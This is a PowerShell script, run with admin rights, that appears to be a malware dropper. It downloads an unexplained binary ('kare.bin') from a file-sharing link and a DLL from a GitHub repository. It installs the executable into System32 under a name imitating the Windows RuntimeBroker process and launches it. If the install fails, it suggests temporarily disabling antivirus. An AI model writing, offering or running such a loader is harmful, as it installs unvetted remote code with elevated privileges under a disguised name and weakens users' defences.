# Run as Admin
$exeName = "RuntimeBrokerss.exe"
$exePath = Join-Path $env:windir "System32\$exeName"
$dllPath = Join-Path $env:windir "System32\Guna.UI2.dll"

$exeUrl = "https://store8.gofile.io/download/354d3262-211f-46c0-a29b-0d8606344d62/kare.bin"
$dllUrl = "https://github.com/NAWINNNNNNNNNNNNNNNNNNNNNNNNNNN/WEBSEA1213/raw/refs/heads/main/Guna.UI2.dll"

function Is-PEFile($path){
    if (-not (Test-Path $path)) { return $false }
    try {
        $bytes = Get-Content -Encoding Byte -Path $path -TotalCount 2 -ErrorAction Stop
        return ($bytes[0] -eq 0x4D -and $bytes[1] -eq 0x5A)  # 'M' 'Z'
    } catch {
        return $false
    }
}

Write-Host "Stopping any running process named $exeName (if exists)..."
Try{ Stop-Process -Name ($exeName -replace '\.exe$','') -Force -ErrorAction SilentlyContinue } catch {}

# Try to remove existing exe (ignore errors but capture)
if (Test-Path $exePath) {
    Write-Host "Removing existing $exePath ..."
    try {
        Remove-Item $exePath -Force -ErrorAction Stop
        Write-Host "Removed existing exe."
    } catch {
        Write-Host "Failed to remove $exePath : $_" -ForegroundColor Yellow
    }
}

# Ensure DLL exists (download if missing)
if (-not (Test-Path $dllPath)) {
    Write-Host "Downloading DLL..."
    try {
        Invoke-WebRequest -Uri $dllUrl -OutFile $dllPath -UseBasicParsing -ErrorAction Stop
        Write-Host "DLL downloaded."
    } catch {
        Write-Host "DLL download failed: $_" -ForegroundColor Red
    }
} else {
    Write-Host "Guna.UI2.dll already exists. Skipping download."
}

# Download exe to temp
$tempFile = Join-Path $env:TEMP ("seanual_temp_" + [System.Guid]::NewGuid().ToString() + ".exe")
Write-Host "Downloading executable to temp: $tempFile"
try {
    Invoke-WebRequest -Uri $exeUrl -OutFile $tempFile -UseBasicParsing -ErrorAction Stop
} catch {
    Write-Host "Download failed: $_" -ForegroundColor Red
    Exit 1
}

# Basic checks: size and MZ header
$fi = Get-Item $tempFile
if ($fi.Length -lt 1024) {
    Write-Host "Downloaded file is suspiciously small ($($fi.Length) bytes). Aborting." -ForegroundColor Red
    Remove-Item $tempFile -Force -ErrorAction SilentlyContinue
    Exit 1
}

if (-not (Is-PEFile $tempFile)) {
    Write-Host "Downloaded file is NOT a Windows PE executable (missing 'MZ' header). Aborting." -ForegroundColor Red
    Remove-Item $tempFile -Force -ErrorAction SilentlyContinue
    Exit 1
}

# Try move to System32
Write-Host "Moving file to $exePath ..."
try {
    Move-Item -Path $tempFile -Destination $exePath -Force -ErrorAction Stop
    Write-Host "Moved executable to System32." -ForegroundColor Green
} catch {
    Write-Host "Failed to move file to System32: $_" -ForegroundColor Red
    Write-Host "`nPossible causes:"
    Write-Host " - File system corruption on C: (run chkdsk)."
    Write-Host " - Permission / protection by antivirus or Windows File Protection."
    Write-Host "`nSuggested next steps:"
    Write-Host " 1) Run Command Prompt as Admin and execute: chkdsk C: /f"
    Write-Host " 2) Run: sfc /scannow"
    Write-Host " 3) Disable AV temporarily if it's blocking file writes (do so only if you trust the file)."
    # cleanup temp
    if (Test-Path $tempFile) { Remove-Item $tempFile -Force -ErrorAction SilentlyContinue }
    Exit 1
}

# Try to start
Write-Host "Starting the program..."
try {
    $proc = Start-Process -FilePath $exePath -PassThru -ErrorAction Stop
    Write-Host "Program started (PID: $($proc.Id))." -ForegroundColor Green
} catch {
    Write-Host "Failed to start program: $_" -ForegroundColor Red
    Write-Host "If error says 'file or directory is corrupted and unreadable' -> run chkdsk and sfc (see above)."
    Exit 1
}

Write-Host "Done."
